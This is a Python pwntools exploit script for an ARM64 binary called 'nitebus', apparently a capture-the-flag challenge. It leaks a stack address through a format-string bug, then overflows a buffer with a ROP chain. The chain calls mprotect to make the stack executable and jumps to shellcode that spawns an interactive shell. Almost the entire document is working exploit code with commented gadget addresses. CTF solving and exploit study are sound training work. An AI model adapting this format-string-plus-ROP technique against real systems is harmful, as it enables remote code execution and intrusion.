#!/usr/bin/env python3

from pwn import *

exe = ELF("./nitebus")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, "break *0x4007e0")
    else:
        r = remote("nitebus.chals.nitectf25.live", 1337, ssl = True)

    return r


def main():
    r = conn()

    # Leak stack and where our input is located
    packet = b"\x01\x08AA%3$p"
    r.sendafter(b"Waiting for nitebus packet...\n", packet)
    r.recvuntil(b"[DIAGNOSTICS] ")
    stack_addr = int(r.recv(14), 16) & 0xFFFFFFFFF000
    log.info(f"stack leak: 0x{stack_addr:x}")


    """
    | Concept                 | x86-64            | ARM64              |
    | ----------------------- | ----------------- | ------------------ |
    | Stack grows             | Down              | Down               |
    | Return instruction      | `ret`             | `ret` (uses `x30`) |
    | Return address register | stored on stack   | `x30` (LR)         |
    | Frame pointer           | `rbp`             | `x29`              |
    | Syscall instruction     | `syscall`         | `svc #0`           |
    | Indirect jump           | `jmp rax`         | `br x16`           |
    | Function args           | `rdi rsi rdx ...` | `x0 x1 x2 ...`     |


    ARM64 functions usually end with:   `ldp x29, x30, [sp], #imm ; ret`
    Stads for "Load Pair of Registers" and loads the first 8 bytes from
    stack pointer `[sp]` to x29, then next 8 bytes to x30. Then increments
    the stack pointer by an immediate value, so "freeing" the current frame.
    """

    # ============================================ GADGETS ============================================
    # 0x000000000044e978 : ldr x1, [sp, #0x28] ; ldp x29, x30, [sp], #0x30 ; csel x0, x1, x0, ne ; ret
    # 0x0000000000435084 : mov x16, x1 ; ldp x29, x30, [sp], #0x30 ; br x16
    # 0x000000000041cf74 : ldr x2, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; mov x0, x2 ; ret
    # 0x000000000043a3f4 : ldr x2, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; add x0, x0, x2 ; ret
    # 0x0000000000436200 : ldp x29, x30, [sp], #0x20 ; br x16
    # =================================================================================================


    shellcode_addr = stack_addr + 0x840 if args.LOCAL else stack_addr + 0x950

    payload = flat(
        b'A' * 152,     # overflow buffer
        0x44e978,       # start of the rop chain
        b'A' * 32,

        # Load &mprotect to `x1` (moves it to `x0` but it's useless) and return to next gadget (0x435084)
        b'B' * 8,       # <---- [sp]
        0x435084,       # next gadget (will be stored in x30)
        b'A' * 24,
        exe.sym['mprotect'],    # <---- [sp + 0x28]

        # Sets up `x16` to be then used later for a call to `mprotect`.
        # This first call will fail without any problem/errors for us.
        b'B' * 8,       # <---- [sp]
        0x44e978,       # next gadget (will be stored in x30)
        b'A' * 32,

        # As before, sets up `x1 = 0x1000` to then move it to `x0` since "neq" flag is already set (thank god)
        b'B' * 8,       # <---- [sp]
        0x41cf74,       # next gadget (will be stored in x30)
        b'A' * 24,
        0x1000,         # <---- [sp + 0x28]

        # Moves the stack address into `x2` to then do `x0 += x2`, so now `x0 = stack_addr + 0x1000`
        # NOTE: we subtract 7 to `stack_addr` since we will reuse this gadget to set up the RWX flags,
        #       but this gadget will add up 7 to our `stack_addr` so that's why this the -7
        b'B' * 8,       # <---- [sp]
        p64(0x43a3f4),  # next gadget (will be stored in x30)
        b'A' * 8,
        p64(stack_addr - 7),    # <---- [sp + 0x18]

        # As explained above, sets up the RWX flags (and will add 7 to `stack_addr` but we accounted that early)
        b'B' * 8,       # <---- [sp]
        0x436200,       # next gadget (will be stored in x30)
        b'A' * 8,
        7,              # <---- [sp + 0x18]

        # This one gadget just pops to `x29` and `x30` and jumps to where `x16` points (so `mprotect`)
        b'B' * 8,       # <---- [sp]
        shellcode_addr, # return to our shellcode

        # Simple shellcode crafted with shellcraft :)
        asm(shellcraft.aarch64.sh())
    )

    packet = b'\x01\x42\x00\x04'
    r.send(packet)
    r.sendlineafter(b'data: ', payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
